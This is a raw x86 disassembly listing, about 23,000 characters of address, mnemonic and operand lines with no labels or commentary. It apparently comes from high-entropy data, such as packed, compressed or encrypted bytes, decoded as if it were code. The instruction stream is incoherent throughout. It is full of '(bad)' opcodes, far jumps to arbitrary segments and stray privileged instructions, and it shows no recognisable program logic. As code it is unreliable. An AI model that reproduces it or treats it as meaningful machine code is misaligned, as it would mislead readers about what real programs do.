  415b98:	jae    0x415b30
  415b9a:	jnp    0x415b93
  415b9c:	int    0xc8
  415b9e:	adc    eax,DWORD PTR [ecx-0x74469480]
  415ba4:	call   0x9333:0x9a511b8a
  415bab:	call   0xe94:0xcc79b108
  415bb2:	or     eax,0x64e0e8d1
  415bb7:	loope  0x415b50
  415bb9:	ret    
  415bba:	sysret 
  415bbc:	sbb    al,0x84
  415bbe:	or     eax,0x5d6fd183
  415bc3:	jne    0x415be2
  415bc5:	sub    edx,DWORD PTR [edi+0x6d]
  415bc8:	fisub  DWORD PTR [edi]
  415bca:	jg     0x415b6f
  415bcc:	out    dx,eax
  415bcd:	int3   
  415bce:	xchg   esi,eax
  415bcf:	jns    0x415b65
  415bd1:	or     bh,dl
  415bd3:	test   BYTE PTR ds:0xeaec929d,ah
  415bd9:	lahf   
  415bda:	mov    eax,0xf6ed217d
  415bdf:	(bad)  
  415be1:	cmc    
  415be2:	mov    bh,0xef
  415be4:	(bad)  
  415be5:	iret   
  415be6:	dec    ecx
  415be7:	imul   esp,DWORD PTR [ebx+0x5b],0xa
  415beb:	add    al,BYTE PTR [edi+0x53]
  415bee:	xor    eax,0x461f6be
  415bf3:	jg     0x415bcc
  415bf5:	dec    ebx
  415bf6:	mov    edi,0x69a1b5fd
  415bfb:	mov    al,0xaf
  415bfd:	and    BYTE PTR [ecx+ebx*1-0x48e9d444],al
  415c04:	and    edx,0x883f626f
  415c0a:	inc    edi
  415c0b:	les    ebp,FWORD PTR [bp+si+0x49]
  415c0f:	pop    esi
  415c10:	in     al,0xfa
  415c12:	popf   
  415c13:	adc    DWORD PTR [edx+0x226515b4],0x548341a0
  415c1d:	add    eax,0xc61dc4ee
  415c22:	dec    esp
  415c23:	and    dh,bl
  415c25:	or     eax,0x5cc378f8
  415c2a:	loop   0x415ca5
  415c2c:	shr    BYTE PTR [edx],cl
  415c2e:	mov    dl,0xc2
  415c30:	retf   
  415c31:	imul   ebx,DWORD PTR [edx],0xdb15105d
  415c37:	cli    
  415c38:	clc    
  415c39:	out    dx,eax
  415c3a:	test   BYTE PTR [edi-0x381b711f],al
  415c40:	cmp    ah,bl
  415c42:	jp     0x415c36
  415c44:	rcl    DWORD PTR [ebx-0x798c1366],cl
  415c4a:	push   esi
  415c4b:	data16 jecxz 0x415c10
  415c4e:	adc    BYTE PTR [eax+0x3],bl
  415c51:	(bad)  
  415c52:	mov    esi,0xd85366e7
  415c57:	out    dx,eax
  415c58:	repnz loop 0x415cad
  415c5b:	(bad)  
  415c5c:	out    dx,al
  415c5d:	mov    al,0xd9
  415c5f:	push   esi
  415c60:	fs jbe 0x415bea
  415c63:	ret    
  415c64:	ins    BYTE PTR es:[edi],dx
  415c65:	inc    esi
  415c66:	add    BYTE PTR [ebp+0x7030a4a4],cl
  415c6c:	dec    ebp
  415c6d:	aas    
  415c6e:	cmp    ah,BYTE PTR [ecx]
  415c70:	sbb    DWORD PTR [edi+0x49],esi
  415c73:	mov    esp,0xb0b0d285
  415c78:	call   0x9060:0xabd362e6
  415c7f:	int3   
  415c80:	ins    BYTE PTR es:[edi],dx
  415c81:	shl    BYTE PTR [ecx+edi*8-0x7e5b871d],cl
  415c88:	mov    ebx,0xf7ea17d4
  415c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c8e:	mov    ch,BYTE PTR [ebx]
  415c90:	mov    al,ds:0xe122e9d7
  415c95:	lods   eax,DWORD PTR ds:[esi]
  415c96:	je     0x415ca4
  415c98:	sub    ah,al
  415c9a:	push   esi
  415c9b:	dec    edx
  415c9c:	pop    es
  415c9d:	jmp    0xd92a72c1
  415ca2:	std    
  415ca3:	test   BYTE PTR [esi+0x56b0cbca],bl
  415ca9:	add    dh,0x42
  415cac:	mov    dh,BYTE PTR [ecx-0x7f]
  415caf:	retf   
  415cb0:	jp     0x415cef
  415cb2:	and    al,0xe4
  415cb4:	arpl   WORD PTR [esi+ebx*1],di
  415cb7:	jge    0x415cf1
  415cb9:	fsub   QWORD PTR [ebx-0x52]
  415cbc:	test   dh,ah
  415cbe:	imul   ebp,DWORD PTR [eax-0x2d],0x14d4aa4
  415cc5:	dec    esi
  415cc6:	jmp    0x27bb:0x63f7d69a
  415ccd:	icebp  
  415cce:	test   al,0xe4
  415cd0:	loope  0x415ce2
  415cd2:	lds    ebx,FWORD PTR [eax+0x75]
  415cd5:	mov    cl,0x58
  415cd7:	and    BYTE PTR [esi+0x20],al
  415cda:	ins    BYTE PTR es:[edi],dx
  415cdb:	scas   al,BYTE PTR es:[edi]
  415cdc:	(bad)  
  415cdd:	cmp    ch,BYTE PTR [edx-0x6861f50c]
  415ce3:	adc    al,0xf0
  415ce5:	stos   BYTE PTR es:[edi],al
  415ce6:	dec    esp
  415ce7:	je     0x415c70
  415ce9:	mov    esi,esi
  415ceb:	lea    eax,[eax+0x790b89c6]
  415cf1:	je     0x415d6b
  415cf3:	ins    DWORD PTR es:[edi],dx
  415cf4:	daa    
  415cf5:	push   ss
  415cf6:	out    0x1a,al
  415cf8:	inc    edi
  415cf9:	mov    bh,0x73
  415cfb:	push   es
  415cfc:	in     eax,0x1
  415cfe:	mov    DWORD PTR [ecx-0x61a95ba4],0x2c03764
  415d08:	mov    BYTE PTR [ebx-0x67],ch
  415d0b:	push   0xffffffc0
  415d0d:	jns    0x415d49
  415d0f:	mov    ebp,DWORD PTR [esp+edi*8]
  415d12:	scas   eax,DWORD PTR es:[edi]
  415d13:	pop    ds
  415d14:	inc    ebp
  415d15:	sub    esi,DWORD PTR [ebx-0x1b]
  415d18:	cmp    BYTE PTR [eax+0x65],al
  415d1b:	in     eax,0xa7
  415d1d:	sub    al,0xe5
  415d1f:	sub    DWORD PTR [esi+0x4386bd78],esp
  415d25:	inc    ebp
  415d26:	push   esi
  415d27:	mov    dl,0xfb
  415d29:	imul   esp,ebp,0x15
  415d2c:	sbb    edx,DWORD PTR [ecx+esi*8+0x517ee23c]
  415d33:	sti    
  415d34:	dec    ebp
  415d35:	sub    ch,BYTE PTR [eax+edx*2-0x3c]
  415d39:	das    
  415d3a:	xor    DWORD PTR [eax+0x1e775828],edx
  415d40:	stc    
  415d41:	ror    esp,1
  415d43:	js     0x415cca
  415d45:	test   al,0x8b
  415d47:	rcl    DWORD PTR [ecx+0x751b7b0f],1
  415d4d:	rol    DWORD PTR [edi-0x31b25e1],cl
  415d53:	dec    ecx
  415d54:	enter  0x2d4b,0x6f
  415d58:	mov    edx,gs
  415d5a:	sbb    eax,0x652fc462
  415d5f:	pop    eax
  415d60:	bound  eax,QWORD PTR [edx]
  415d62:	mov    dh,0xc2
  415d64:	add    dl,BYTE PTR [eax]
  415d66:	pop    ss
  415d67:	xor    BYTE PTR [esi+0x47],cl
  415d6a:	stos   BYTE PTR es:[edi],al
  415d6b:	push   esi
  415d6c:	neg    DWORD PTR [ebp-0x69bab5c4]
  415d72:	fs in  eax,0x8e
  415d75:	cmp    BYTE PTR [esp+eax*4+0x26],0x2d
  415d7a:	pop    edi
  415d7b:	adc    DWORD PTR [edi],0xe2f39042
  415d81:	adc    eax,0xaf938d73
  415d86:	jmp    0x415d4c
  415d88:	fs sbb eax,0xe9c8eb70
  415d8e:	cs pop ss
  415d90:	push   ds
  415d91:	xchg   ecx,eax
  415d92:	mov    ds:0xdade338f,eax
  415d97:	xchg   esp,eax
  415d98:	mov    edi,0x5cae30e2
  415d9d:	mov    eax,0xbcdc56e
  415da2:	add    eax,0xba023b9b
  415da7:	sub    DWORD PTR [ebx+0x53bfed60],esi
  415dad:	mov    ds:0xb4b88b87,eax
  415db2:	out    dx,eax
  415db3:	jl     0x415e07
  415db5:	mov    al,ds:0xb7d0c907
  415dba:	aam    0xaa
  415dbc:	mov    ecx,0xc9dbcfa7
  415dc1:	xor    ah,bl
  415dc3:	clc    
  415dc4:	std    
  415dc5:	xchg   edi,eax
  415dc6:	shr    BYTE PTR [esi-0x7c],0x58
  415dca:	imul   eax,DWORD PTR [ecx-0x60],0xb4b96874
  415dd1:	inc    eax
  415dd2:	and    DWORD PTR [ecx-0x138c1c2f],eax
  415dd8:	(bad)  
  415dd9:	in     al,0xc
  415ddb:	dec    ebx
  415ddc:	call   0xbb7154ec
  415de1:	adc    al,0xde
  415de3:	jg     0x415d7e
  415de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415de6:	pop    ebp
  415de7:	adc    eax,0x652445b0
  415dec:	ja     0x415e1e
  415dee:	(bad)  
  415def:	sbb    eax,0xdcc62463
  415df4:	sbb    al,0xf
  415df6:	(bad)  
  415df7:	loopne 0x415e18
  415df9:	in     eax,dx
  415dfa:	mov    ah,0xb3
  415dfc:	jge    0x415e6a
  415dfe:	(bad)  
  415dff:	mov    ebx,0x13385c39
  415e04:	mov    eax,ds:0x927d45ee
  415e09:	mov    eax,0x4874b53
  415e0e:	paddsb mm6,QWORD PTR [ebx-0x5078dd68]
  415e15:	outs   dx,DWORD PTR ds:[esi]
  415e16:	inc    eax
  415e17:	mov    DWORD PTR ds:0x9131365b,eax
  415e1d:	gs mov edx,0xdcadc929
  415e23:	xchg   edi,eax
  415e24:	mov    ah,0x87
  415e26:	loop   0x415dc0
  415e28:	inc    edi
  415e29:	push   ebp
  415e2a:	mov    ebx,0xe3e4675e
  415e2f:	scas   al,BYTE PTR es:[edi]
  415e30:	js     0x415e72
  415e32:	cld    
  415e33:	dec    edx
  415e34:	mov    ss,WORD PTR [ecx]
  415e36:	cmp    dh,dl
  415e38:	or     al,0x5f
  415e3a:	cmp    DWORD PTR [eax],esi
  415e3c:	gs loop 0x415e1c
  415e3f:	imul   esi,DWORD PTR [edx+0x6217ccb6],0xffffff8e
  415e46:	(bad)  
  415e47:	clc    
  415e48:	sti    
  415e49:	sbb    ah,BYTE PTR [ebp-0x1b3ea298]
  415e4f:	push   edx
  415e50:	(bad)  
  415e51:	dec    ecx
  415e52:	in     al,dx
  415e53:	inc    ebp
  415e54:	cmp    dh,BYTE PTR [edx-0x9]
  415e57:	fcmovne st,st(0)
  415e59:	cmp    al,0x9f
  415e5b:	lods   al,BYTE PTR ds:[esi]
  415e5c:	fstp   QWORD PTR [ebp+0x3ff62052]
  415e62:	xor    eax,0x8292ba0b
  415e67:	aad    0xa7
  415e69:	jmp    0x415e6a
  415e6b:	pusha  
  415e6c:	ins    DWORD PTR es:[edi],dx
  415e6d:	loopne 0x415e15
  415e6f:	pop    eax
  415e70:	sar    BYTE PTR [edx+0x6056ecbe],1
  415e76:	xor    DWORD PTR [ecx],edx
  415e78:	inc    esp
  415e79:	test   al,0x61
  415e7b:	mov    cl,0xea
  415e7d:	inc    eax
  415e7e:	push   esp
  415e7f:	(bad)  
  415e80:	mov    ah,0x25
  415e82:	jmp    0xc629b832
  415e87:	pop    edi
  415e88:	inc    ebx
  415e89:	mov    ebx,0xefbc83df
  415e8e:	ss sti 
  415e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e91:	outs   dx,BYTE PTR ds:[esi]
  415e92:	not    DWORD PTR [ecx+0x19]
  415e95:	adc    al,0x91
  415e97:	xor    bl,BYTE PTR [ebx+0x77]
  415e9a:	cmp    ecx,DWORD PTR [ebx+eax*4+0x25b32d3a]
  415ea1:	ret    0xdd87
  415ea4:	jle    0x415f09
  415ea6:	je     0x415edb
  415ea8:	addr16 std 
  415eaa:	dec    ecx
  415eab:	cmp    DWORD PTR [ebp-0xa],0xb9030c72
  415eb2:	fist   DWORD PTR [esi+0x63d3893f]
  415eb8:	outs   dx,BYTE PTR ds:[esi]
  415eb9:	jne    0x415f0d
  415ebb:	add    ecx,ebp
  415ebd:	leave  
  415ebe:	in     al,0x99
  415ec0:	mov    edx,0x7f9a1120
  415ec5:	pushf  
  415ec6:	mov    ah,BYTE PTR [ecx]
  415ec8:	xchg   ecx,eax
  415ec9:	lods   al,BYTE PTR ds:[esi]
  415eca:	into   
  415ecb:	int3   
  415ecc:	cs mov edi,edx
  415ecf:	cli    
  415ed0:	dec    ebx
  415ed1:	pop    edx
  415ed2:	push   ss
  415ed3:	ss and eax,0x8da65a13
  415ed9:	pop    ds
  415eda:	push   edi
  415edb:	mov    ch,0x51
  415edd:	mov    esi,0xdcf3716a
  415ee2:	or     DWORD PTR [ecx-0x16d6182d],esp
  415ee8:	adc    eax,0xce864416
  415eed:	mov    edi,DWORD PTR [esi-0x6586a039]
  415ef3:	out    0xd8,al
  415ef5:	hlt    
  415ef6:	push   eax
  415ef7:	lahf   
  415ef8:	mov    ebx,edx
  415efa:	mov    ds:0x818bbc83,eax
  415eff:	xchg   ebp,eax
  415f00:	cmp    DWORD PTR [esi],esi
  415f02:	xor    BYTE PTR ds:0x817772c0,ch
  415f08:	sub    cl,0xeb
  415f0b:	adc    BYTE PTR [ebp-0x7e32ccb3],bh
  415f11:	in     al,dx
  415f12:	xchg   ebx,eax
  415f13:	push   ss
  415f14:	jo     0x415ef3
  415f16:	sub    eax,0xd76a4718
  415f1b:	jle    0x415f3e
  415f1d:	inc    eax
  415f1e:	(bad)  
  415f1f:	lds    ebx,FWORD PTR [edi]
  415f21:	jo     0x415ee3
  415f23:	je     0x415eae
  415f25:	gs ret 0x85f3
  415f29:	sub    bl,BYTE PTR [edx]
  415f2b:	or     BYTE PTR [edi+0x76],cl
  415f2e:	test   BYTE PTR [ecx],bl
  415f30:	les    edi,FWORD PTR [ebx+0x3dc96596]
  415f36:	cwde   
  415f37:	jge    0x415f95
  415f39:	arpl   WORD PTR [esi],dx
  415f3b:	sti    
  415f3c:	adc    eax,0xd2a81d1f
  415f41:	pop    ss
  415f42:	addr16 jmp 0x415f11
  415f45:	pop    ebx
  415f46:	shld   esi,esp,0x36
  415f4a:	sbb    DWORD PTR [esi],0xffffffc0
  415f4d:	pop    ss
  415f4e:	add    eax,0xca8e4ee7
  415f53:	or     edx,DWORD PTR [edi+0x75418706]
  415f59:	popf   
  415f5a:	dec    ebp
  415f5b:	pop    edi
  415f5c:	pop    ds
  415f5d:	in     al,0x88
  415f5f:	(bad)  
  415f60:	enter  0xc91a,0xe5
  415f64:	sbb    eax,0xd4250b18
  415f69:	jae    0x415fc1
  415f6b:	ja     0x415f34
  415f6d:	pop    esi
  415f6e:	clc    
  415f6f:	shl    BYTE PTR [eax+0x72fb515f],0x50
  415f76:	add    BYTE PTR [edx],dl
  415f78:	mov    ch,0x43
  415f7a:	mov    ebp,ss
  415f7c:	arpl   WORD PTR [edx-0x3439165],cx
  415f82:	leave  
  415f83:	nop
  415f84:	sbb    BYTE PTR [ecx],dl
  415f86:	fstp   QWORD PTR [ebx]
  415f88:	test   eax,0x6f597de0
  415f8d:	and    cl,dl
  415f8f:	scas   al,BYTE PTR es:[edi]
  415f90:	mov    eax,ds:0x4eaea151
  415f95:	imul   esp,DWORD PTR ds:0x2475ee6a,0x64
  415f9c:	or     esp,edx
  415f9e:	cdq    
  415f9f:	push   cs
  415fa0:	lahf   
  415fa1:	(bad)  
  415fa2:	adc    ebx,DWORD PTR [eax+0x69b56250]
  415fa8:	and    edx,DWORD PTR [ebp-0x3a7cf3b8]
  415fae:	lock add ecx,DWORD PTR [edi+0x7ea02537]
  415fb5:	scas   eax,DWORD PTR es:[edi]
  415fb6:	add    eax,0x7c2ecc63
  415fbb:	imul   ebx,DWORD PTR [edx+edx*1+0x7a7d19ad],0xffffff81
  415fc3:	pushf  
  415fc4:	inc    esp
  415fc5:	xchg   DWORD PTR [edx],ecx
  415fc7:	fiadd  DWORD PTR [edi+0x18bab07b]
  415fcd:	sub    al,0xf9
  415fcf:	xchg   edx,eax
  415fd0:	pop    ebp
  415fd1:	gs (bad) 
  415fd3:	sti    
  415fd4:	pop    esp
  415fd5:	pop    es
  415fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fd7:	stc    
  415fd8:	les    esp,FWORD PTR [eax+0x522ade5f]
  415fde:	sahf   
  415fdf:	out    dx,eax
  415fe0:	test   DWORD PTR [eax+0x1e],ebp
  415fe3:	push   ss
  415fe4:	push   cs
  415fe5:	hlt    
  415fe6:	jge    0x415fee
  415fe8:	sub    esi,eax
  415fea:	shl    DWORD PTR [edx],cl
  415fec:	mov    ebp,0x1b4a5ca1
  415ff1:	sbb    eax,0x4c5f9e29
  415ff6:	shl    BYTE PTR [edi],cl
  415ff8:	aad    0x8e
  415ffa:	out    0xb4,al
  415ffc:	lahf   
  415ffd:	mov    ah,0xec
  415fff:	js     0x415fec
  416001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416002:	test   eax,0x3ac26cbd
  416007:	and    DWORD PTR [edx],0xffffffe7
  41600a:	mov    esi,0xb728372c
  41600f:	add    ch,BYTE PTR [ebp-0x58]
  416012:	or     eax,0xd6ee323c
  416017:	or     al,BYTE PTR [ecx-0x39]
  41601a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41601b:	add    ecx,DWORD PTR ds:0xf5b819d6
  416021:	jle    0x41604b
  416023:	xchg   edi,eax
  416024:	out    dx,eax
  416025:	or     BYTE PTR [ebx],al
  416027:	out    0x89,al
  416029:	retf   0x281d
  41602c:	push   edi
  41602d:	sbb    al,0x73
  41602f:	mov    bl,0x40
  416031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416032:	sbb    BYTE PTR [eax-0x4a],bh
  416035:	mov    ch,0x2a
  416037:	retf   
  416038:	jno    0x415fd0
  41603a:	jnp    0x41600c
  41603c:	add    al,0xab
  41603e:	test   al,0x35
  416040:	and    eax,0x7fb9a40f
  416045:	mov    eax,ds:0x5442a3f5
  41604a:	and    BYTE PTR [eax-0x2b46b319],al
  416050:	pop    edx
  416051:	adc    BYTE PTR [ebx-0x1c85babd],al
  416057:	pop    eax
  416058:	mov    ds:0xc9a727a9,al
  41605d:	imul   esi,DWORD PTR [esi+0x2f],0xfffffffb
  416061:	jp     0x4160bf
  416063:	sahf   
  416064:	adc    BYTE PTR [ebx-0x3f],0x27
  416068:	dec    ebp
  416069:	pushf  
  41606a:	imul   BYTE PTR [edi+0x3ee476a]
  416070:	mov    ebp,DWORD PTR [eax+0x19]
  416073:	push   0x8304d2ac
  416078:	into   
  416079:	fiadd  WORD PTR [edx+esi*2-0x1e]
  41607d:	adc    ecx,ebp
  41607f:	add    al,BYTE PTR [ebx+0x60543d63]
  416085:	lods   al,BYTE PTR ds:[esi]
  416086:	cmp    BYTE PTR [ebx],bl
  416088:	or     dl,BYTE PTR [eax]
  41608a:	rcl    DWORD PTR [ebx],0x4a
  41608d:	(bad)  
  41608e:	pushf  
  41608f:	xchg   ebp,eax
  416090:	std    
  416091:	jbe    0x41602b
  416093:	bound  esp,QWORD PTR [ecx+0x49]
  416096:	xor    al,0xaa
  416098:	push   ebx
  416099:	mov    cl,0x67
  41609b:	leave  
  41609c:	push   ebx
  41609d:	aas    
  41609e:	add    cl,al
  4160a0:	mov    gs,edi
  4160a2:	scas   eax,DWORD PTR es:[edi]
  4160a3:	xor    DWORD PTR ds:0xd6b7e520,ebp
  4160a9:	daa    
  4160aa:	mov    dh,0xc2
  4160ac:	xchg   ebp,eax
  4160ad:	(bad)  
  4160ae:	xor    DWORD PTR [edx],0x10
  4160b1:	dec    esp
  4160b2:	adc    DWORD PTR [ebx-0x342daf],ebx
  4160b8:	jns    0x416114
  4160ba:	push   ecx
  4160bb:	dec    eax
  4160bc:	or     edx,DWORD PTR [ecx+0x12]
  4160bf:	icebp  
  4160c0:	aam    0x87
  4160c2:	pop    ebp
  4160c3:	ja     0x416099
  4160c5:	push   ecx
  4160c6:	pushf  
  4160c7:	hlt    
  4160c8:	ds jno 0x416128
  4160cb:	cld    
  4160cc:	sbb    dl,al
  4160ce:	push   0x53fa497a
  4160d3:	mov    eax,0xaf0d3bc7
  4160d8:	les    esi,FWORD PTR [edi-0x70]
  4160db:	and    eax,0xb4a41f75
  4160e0:	jmp    FWORD PTR [ecx]
  4160e2:	shl    BYTE PTR [ebp+ebp*4-0x31],cl
  4160e6:	(bad)  
  4160e7:	nop
  4160e8:	cmc    
  4160e9:	ror    DWORD PTR [eax],1
  4160eb:	xchg   edx,eax
  4160ec:	mov    edx,0x3a196600
  4160f1:	inc    esi
  4160f2:	loopne 0x416136
  4160f4:	xlat   BYTE PTR ds:[ebx]
  4160f5:	leave  
  4160f6:	fld    TBYTE PTR [eax+0x0]
  4160f9:	or     BYTE PTR [ebp+esi*2+0x7f],bh
  4160fd:	push   eax
  4160fe:	data16 loopne 0x4160a5
  416101:	call   0x5edcc19c
  416106:	mov    ss,WORD PTR [eax+ebp*4]
  416109:	repz out 0xb6,eax
  41610c:	jnp    0x416152
  41610e:	xor    ch,BYTE PTR [eax+0x51]
  416111:	mov    ds:0x10698917,eax
  416116:	add    edi,ebx
  416118:	rcr    BYTE PTR [eax+0x21],1
  41611b:	daa    
  41611c:	pop    ss
  41611d:	mov    bl,0x65
  41611f:	jb     0x4160e7
  416121:	imul   edi,DWORD PTR [ecx],0xf582e155
  416127:	push   eax
  416128:	bound  edi,QWORD PTR [eax-0xae9df61]
  41612e:	adc    ebx,DWORD PTR [eax]
  416130:	fld    DWORD PTR [edi-0x456ee994]
  416136:	aad    0x1e
  416138:	mov    ebx,0x407cd4e
  41613d:	mov    bh,0x72
  41613f:	xor    BYTE PTR [ebx-0x31],bl
  416142:	jnp    0x4160dc
  416144:	mov    esp,0xd4215ece
  416149:	jmp    0x6af76aeb
  41614e:	sub    DWORD PTR [ebp+0x28],ebx
  416151:	test   eax,0x5fbc7b30
  416156:	pop    eax
  416157:	inc    eax
  416158:	sbb    ebp,esi
  41615a:	or     bl,BYTE PTR [ebx]
  41615c:	call   0x84d07c17
  416161:	out    0x9a,al
  416163:	out    dx,eax
  416164:	into   
  416165:	sub    eax,0x32eca1d0
  41616a:	inc    esp
  41616b:	mov    BYTE PTR [edi],ah
  41616d:	stos   DWORD PTR es:[edi],eax
  41616e:	cmp    DWORD PTR [ecx-0x6b],esp
  416171:	jge    0x416198
  416173:	neg    BYTE PTR [ebx-0x17bf3c4a]
  416179:	arpl   WORD PTR [ecx+0x7b6f9326],bx
  41617f:	lea    esi,[ebx-0x69]
  416182:	push   ebx
  416183:	(bad)  
  416184:	xor    eax,0xc7b5fb99
  416189:	(bad)  
  41618a:	shl    edx,cl
  41618c:	dec    esp
  41618d:	(bad)  
  41618f:	push   es
  416190:	mov    al,BYTE PTR [esi]
  416192:	nop
  416193:	int3   
  416194:	dec    edx
  416195:	out    dx,al
  416196:	dec    esi
  416197:	rcr    DWORD PTR [eax],cl
  416199:	mov    bh,BYTE PTR [esi-0x6b]
  41619c:	div    edx
  41619e:	inc    esp
  41619f:	aad    0x57
  4161a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a2:	in     al,dx
  4161a3:	sti    
  4161a4:	stos   DWORD PTR es:[edi],eax
  4161a5:	arpl   WORD PTR [eax],di
  4161a7:	push   ebp
  4161a8:	(bad)  
  4161a9:	ins    DWORD PTR es:[edi],dx
  4161aa:	jg     0x416192
  4161ac:	and    bl,BYTE PTR [ecx+0x79]
  4161af:	gs pop eax
  4161b1:	sti    
  4161b2:	push   cs
  4161b3:	(bad)  
  4161b4:	cdq    
  4161b5:	es mov bh,0xb0
  4161b8:	jnp    0x416162
  4161ba:	pop    ebx
  4161bb:	add    al,0x16
  4161bd:	xor    al,0x39
  4161bf:	add    al,0x1f
  4161c1:	mov    edi,0x8d32f286
  4161c6:	add    al,0xb7
  4161c8:	arpl   WORD PTR [edx+0x7132ede4],cx
  4161ce:	add    DWORD PTR [ebp-0x49],esp
  4161d1:	adc    al,0x81
  4161d3:	pop    ebx
  4161d4:	inc    esi
  4161d5:	sbb    al,0xc9
  4161d7:	scas   al,BYTE PTR es:[edi]
  4161d8:	ret    
  4161d9:	into   
  4161da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161db:	mov    al,0xaf
  4161dd:	xor    ecx,ecx
  4161df:	sub    al,al
  4161e1:	retf   
  4161e2:	aaa    
  4161e3:	jecxz  0x4161bb
  4161e5:	ds hlt 
  4161e7:	bnd jbe 0x41624b
  4161ea:	lock push 0xffffffd8
  4161ed:	mul    bh
  4161ef:	mov    edi,0x12b8c1e5
  4161f4:	sub    DWORD PTR [edi+0x36],0x1c5c63cb
  4161fb:	aas    
  4161fc:	add    DWORD PTR [edx-0x7b],esp
  4161ff:	ret    0xacfa
  416202:	enter  0xbc79,0x44
  416206:	mov    eax,ds:0xfd70f4ba
  41620b:	imul   esi,DWORD PTR [edi+0x4bb4ef97],0x76
  416212:	cmp    BYTE PTR [edx+0x55],0x5b
  416216:	mov    WORD PTR [ecx+0x2c073b8d],fs
  41621c:	aad    0x5f
  41621e:	add    DWORD PTR [edi+0x1aa5dbf8],ecx
  416224:	sub    al,0xcc
  416226:	inc    edi
  416227:	in     eax,dx
  416228:	mov    ebp,0x5be231ef
  41622d:	cld    
  41622e:	aas    
  41622f:	sbb    DWORD PTR [ebx-0x5d],eax
  416232:	pop    eax
  416233:	inc    edi
  416234:	daa    
  416235:	jmp    0x405d:0x5a8d997
  41623c:	bound  esi,QWORD PTR [edi]
  41623e:	cli    
  41623f:	jne    0x41627c
  416241:	mov    al,0x4c
  416243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416244:	pop    esi
  416245:	fcmovbe st,st(7)
  416247:	cmp    BYTE PTR [edi],bh
  416249:	pop    ss
  41624a:	mov    cs,WORD PTR [ebp+0x64d4882d]
  416250:	rcr    esp,0xbf
  416253:	dec    esi
  416254:	repnz pop ecx
  416256:	pop    ss
  416257:	jbe    0x41627a
  416259:	adc    ecx,ecx
  41625b:	test   DWORD PTR [ecx+0x1cb18138],esi
  416261:	retf   0xa439
  416264:	nop
  416265:	xor    cl,BYTE PTR [ebp-0x20dc1628]
  41626b:	add    eax,DWORD PTR [ebx-0x45]
  41626e:	and    ebx,DWORD PTR [esi-0x3d]
  416271:	push   edi
  416272:	inc    edi
  416273:	ja     0x4162a6
  416275:	lahf   
  416276:	aam    0xee
  416278:	pop    ebx
  416279:	cmp    BYTE PTR [edx],ch
  41627b:	and    esp,eax
  41627d:	sbb    eax,0x5b69bf7c
  416282:	pop    ebx
  416283:	mov    bh,0x86
  416285:	aaa    
  416286:	push   ebp
  416287:	and    ecx,DWORD PTR [ebp-0x1d868ba8]
  41628d:	lea    ecx,[ecx+esi*2-0x17cdbefa]
  416294:	adc    edi,edx
  416296:	shl    BYTE PTR [ebx+0x66],cl
  416299:	or     al,0xf1
  41629b:	icebp  
  41629c:	popf   
  41629d:	and    al,0x79
  41629f:	lock pop es
  4162a1:	aam    0x3e
  4162a3:	jno    0x416306
  4162a5:	data16 jnp 0x416247
  4162a8:	(bad)  
  4162a9:	ds push edx
  4162ab:	cmp    DWORD PTR [ebx],0xffffff9c
  4162ae:	fist   DWORD PTR [esi-0x3c]
  4162b1:	inc    edx
  4162b2:	dec    ebx
  4162b3:	stos   BYTE PTR es:[edi],al
  4162b4:	fldcw  WORD PTR [ebp-0x76d53697]
  4162ba:	out    dx,eax
  4162bb:	inc    esi
  4162bc:	sub    DWORD PTR [ecx+0x6d],edi
  4162bf:	add    DWORD PTR [edx],0x4a
  4162c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162c3:	xchg   esp,eax
  4162c4:	out    0xc7,al
  4162c6:	pushf  
  4162c7:	dec    edx
  4162c8:	imul   eax,DWORD PTR [ecx-0x26],0xffffffb9
  4162cc:	int3   
  4162cd:	xchg   bl,dl
  4162cf:	xor    edx,DWORD PTR [esp+ebx*2-0x36]
  4162d3:	adc    eax,0xbd2a73f9
  4162d8:	xor    al,0x84
  4162da:	xor    al,0x35
  4162dc:	add    al,cl
  4162de:	rcl    BYTE PTR [eax],1
  4162e0:	dec    esi
  4162e1:	pop    es
  4162e2:	out    dx,al
  4162e3:	xor    eax,0xa4341ecf
  4162e8:	pop    ebp
  4162e9:	(bad)  
  4162ea:	ds (bad) 
  4162ec:	(bad)  
  4162ee:	and    BYTE PTR [edx-0x3e],al
  4162f1:	or     BYTE PTR [ebp+0x7e],0x4b
  4162f5:	jl     0x416296
  4162f7:	pop    ecx
  4162f8:	jb     0x416348
  4162fa:	mov    ebp,0xf1bd81bf
  4162ff:	adc    eax,0xf957b856
  416304:	call   0x79c7a289
  416309:	lahf   
  41630a:	or     DWORD PTR [esi+eiz*8-0x6],ebx
  41630e:	add    edi,DWORD PTR [ebx+0x64a9dfa8]
  416314:	push   es
  416315:	and    esi,edi
  416317:	scas   al,BYTE PTR es:[edi]
  416318:	outs   dx,BYTE PTR ds:[esi]
  416319:	fcom   QWORD PTR [ebp-0x711ddef0]
  41631f:	jl     0x416350
  416321:	cmp    edi,edx
  416323:	xchg   esi,eax
  416324:	mov    ecx,0x3d71a9a8
  416329:	rol    BYTE PTR [ebp+0x3f],cl
  41632c:	iret   
  41632d:	mov    esi,0xbec8e91e
  416332:	sbb    bh,ah
  416334:	push   edx
  416335:	jnp    0x4162ff
  416337:	nop
  416338:	xchg   esp,eax
  416339:	mov    cl,0x2
  41633b:	xchg   BYTE PTR [edx+0x28d1c461],ch
  416341:	dec    esp
  416342:	daa    
  416343:	push   ebx
  416344:	and    eax,0x967a3e29
  416349:	retf   
  41634a:	je     0x41639f
  41634c:	jp     0x4163b2
  41634e:	jno    0x4162ef
  416350:	jge    0x4163a9
  416352:	out    dx,al
  416353:	and    DWORD PTR [ebx-0x40dbc78d],0x20
  41635a:	stos   BYTE PTR es:[edi],al
  41635b:	mov    bl,0x18
  41635d:	dec    ebx
  41635e:	fwait
  41635f:	lahf   
  416360:	shl    BYTE PTR [ecx],cl
  416362:	aaa    
  416363:	mov    eax,ds:0x581f0507
